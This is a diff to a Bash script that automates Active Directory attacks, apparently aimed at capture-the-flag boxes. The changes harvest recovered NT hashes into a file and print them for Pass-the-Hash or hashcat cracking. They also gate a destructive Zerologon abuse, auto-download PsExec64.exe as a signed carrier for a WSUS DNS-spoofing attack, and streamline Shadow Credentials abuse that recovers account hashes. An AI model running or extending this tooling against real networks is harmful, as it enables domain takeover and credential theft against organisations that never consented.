@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.29.0"
+readonly VERSION="1.30.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -317,6 +317,13 @@ queue_cred() {  # queue_cred <user> <password|""> <nthash|""> [via-technique]
         [[ -n "$u" ]] && err "Ignoring implausible identity '$u' (looks like a path/filename)"
         return
     fi
+    # Surface recovered NT hashes (the VALUE) for the final harvest — captured here
+    # so it's recorded even if this exact cred is later de-duped from the queue.
+    if [[ -n "$h" && -n "$OUTDIR" ]]; then
+        local _hh="${h##*:}"
+        [[ "$_hh" =~ ^[a-fA-F0-9]{32}$ ]] && ! grep -qiF "${u}:${_hh}" "$OUTDIR/recovered_hashes.txt" 2>/dev/null \
+            && printf '%-30s %s  ⟵  %s\n' "$u" "$_hh" "$via" >>"$OUTDIR/recovered_hashes.txt"
+    fi
     local user_key="${u,,}" key; key="$(cred_key "$u" "$p" "$h")"
     # Record the attack-chain edge (the identity we're acting as --via--> this one)
     # the FIRST time we learn of it — even if already seen/queued — so the final
@@ -598,6 +605,35 @@ phase_hosts_time() {
         fi
     else
         warn "No sudo or no domain: skipping /etc/hosts (add manually: $DC_IP $DC_FQDN $DOMAIN)"
+    fi
+
+    # A correct krb5.conf for the TARGET realm. CRITICAL: tools that rely on the
+    # system /etc/krb5.conf (evil-winrm, nxc winrm) silently fail Kerberos when it's
+    # left pointing at a PREVIOUS box's realm (e.g. default_realm = OTHERBOX.HTB).
+    # We write a per-run config and point KRB5_CONFIG at it, so every Kerberos tool
+    # uses the right realm/KDC — no sudo, no touching the system file.
+    if [[ -n "$DOMAIN" && -n "$DC_FQDN" ]]; then
+        subsection "Writing a target-correct krb5.conf"
+        local realm="${DOMAIN^^}" kc="$OUTDIR/krb5.conf"
+        cat >"$kc" <<KRB5CONF
+[libdefaults]
+    default_realm = $realm
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    rdns = false
+    udp_preference_limit = 1
+[realms]
+    $realm = {
+        kdc = $DC_FQDN
+        admin_server = $DC_FQDN
+        default_domain = $DOMAIN
+    }
+[domain_realm]
+    .$DOMAIN = $realm
+    $DOMAIN = $realm
+KRB5CONF
+        export KRB5_CONFIG="$kc"
+        ok "krb5.conf → realm ${C_BOLD}$realm${C_RESET} (KRB5_CONFIG set → fixes evil-winrm / nxc Kerberos)"
     fi
 
     subsection "Synchronizing clock with the DC (critical for Kerberos)"
@@ -1350,7 +1386,9 @@ phase_cve_checks() {
     # Keep the default CVE pass fast. Spooler/coerce_plus give actionable relay
     # signal cheaply; printnightmare is comparatively slow/noisy and is only run
     # when explicitly requested with --deep-cve.
-    local modules=(zerologon spooler coerce_plus)
+    # Zerologon is OFF by default: on a patched/modern DC it's never vulnerable and
+    # the nxc check is slow/noisy for nothing. Only run it under --deep-cve.
+    local modules=(spooler coerce_plus)
     [[ "$DEEP_CVE" == "1" ]] && modules=(zerologon printnightmare spooler coerce_plus)
     local m
     for m in "${modules[@]}"; do
@@ -1447,6 +1485,7 @@ phase_nopac_abuse() {
 ZEROLOGON_DONE=0
 phase_zerologon_abuse() {
     [[ "$ZEROLOGON_DONE" == "1" ]] && return
+    [[ "$DEEP_CVE" != "1" ]] && return                       # off by default (slow/noisy; modern DCs immune) → --deep-cve
     [[ "$DO_ABUSE" != "1" ]] && return                       # opt-in: it's destructive
     [[ "$IS_DC_ADMIN" == "1" ]] && return                    # already own the DC
     [[ -z "$DC_HOST" || -z "$DC_IP" || -z "$DOMAIN" ]] && return
@@ -2239,9 +2278,20 @@ phase_wsus() {
         # AUTO — but ONLY if we actually hold the PERMISSION. The permission for the
         # DNS-redirect spoof is DNS-write over the WSUS host: we TEST it by adding the
         # record; if it is denied we do nothing automatic and fall back to the playbook.
-        # Also needs a Microsoft-signed carrier (e.g. PsExec64.exe) — we can't ship it.
+        # Also needs a Microsoft-SIGNED carrier (e.g. PsExec64.exe). We can't ship it,
+        # but it's served by Microsoft's own Sysinternals Live — fetch it automatically.
         local carrier dx wlabel="${wsrv%%.*}" dauth
         carrier=$(ls "$OUTDIR"/PsExec*.exe ./PsExec*.exe 2>/dev/null | head -1)
+        if [[ -z "$carrier" && "$DO_ABUSE" == "1" ]] && have curl; then
+            info "Fetching a Microsoft-signed carrier (PsExec64.exe) from Sysinternals Live…"
+            if curl -fsSL -o "$OUTDIR/PsExec64.exe" https://live.sysinternals.com/PsExec64.exe 2>/dev/null \
+               && [[ -s "$OUTDIR/PsExec64.exe" ]]; then
+                carrier="$OUTDIR/PsExec64.exe"; ok "Carrier downloaded → PsExec64.exe"
+            else
+                rm -f "$OUTDIR/PsExec64.exe" 2>/dev/null
+                info "Could not auto-download PsExec64.exe (offline?) — drop it in $OUTDIR manually."
+            fi
+        fi
         dx="$(external_tool krbrelayx/dnstool.py)"
         if [[ "$DO_ABUSE" == "1" && -n "$pw" && -n "$dx" && -n "$ip" && -n "$wsrv" && -n "$carrier" ]] \
            && { [[ -n "$PASS" || -n "$HASH" ]]; }; then
@@ -2714,6 +2764,13 @@ _abuse_shadowcred() {
     local target="$1"
     { have certipy || have bloodyAD; } || return 1
     [[ "$DO_ABUSE" != "1" ]] && { info "  (--abuse to try Shadow Credentials on '$target')"; return 1; }
+    # Dedup: if we already recovered this target's hash (another ACL path / BH edge
+    # in this run), don't re-run the whole flow — it's slow and just spams duplicate
+    # output. One success per target is enough.
+    if [[ -s "$OUTDIR/recovered_hashes.txt" ]] && grep -qiE "^${target//$/\\$}[[:space:]]" "$OUTDIR/recovered_hashes.txt" 2>/dev/null; then
+        info "  Shadow Credentials on '$target' already done (hash recovered) → skipping repeat"
+        return 0
+    fi
     abuse_confirm "  Shadow Credentials on '${target}' (non-destructive, recovers its hash)?" || return 1
     # If the writer is in Protected Users, NTLM is dead and certipy's Kerberos LDAP
     # bind chokes (data 57) — skip certipy and go straight to bloodyAD (its Kerberos
@@ -5287,6 +5344,16 @@ final_summary() {
                 if [[ -n "$who" ]]; then detail "      ${C_GREEN}${C_BOLD}${who%%:*}${C_RESET} ${C_DIM}:${C_RESET} ${C_GREEN}$p${C_RESET}"
                 else detail "      ${C_GREEN}$p${C_RESET}"; fi
             done < <(sort -u "$OUTDIR/found_passwords.txt")
+        fi
+
+        if [[ -s "$OUTDIR/recovered_hashes.txt" ]]; then
+            detail "  ${C_BOLD}${C_MAGENTA}» NT hashes recovered${C_RESET} ${C_DIM}($(grep -c . "$OUTDIR/recovered_hashes.txt") — Pass-the-Hash · hashcat -m 1000)${C_RESET}"
+            local _hl _hu _hh
+            while IFS= read -r _hl; do
+                [[ -z "$_hl" ]] && continue
+                _hu=$(awk '{print $1}' <<<"$_hl"); _hh=$(awk '{print $2}' <<<"$_hl")
+                detail "      ${C_MAGENTA}${C_BOLD}${_hu}${C_RESET} ${C_DIM}:${C_RESET} ${C_MAGENTA}${_hh}${C_RESET}"
+            done < "$OUTDIR/recovered_hashes.txt"
         fi
 
         if [[ -s "$OUTDIR/asrep_hashes.txt" ]] && grep -qi krb5asrep "$OUTDIR/asrep_hashes.txt"; then
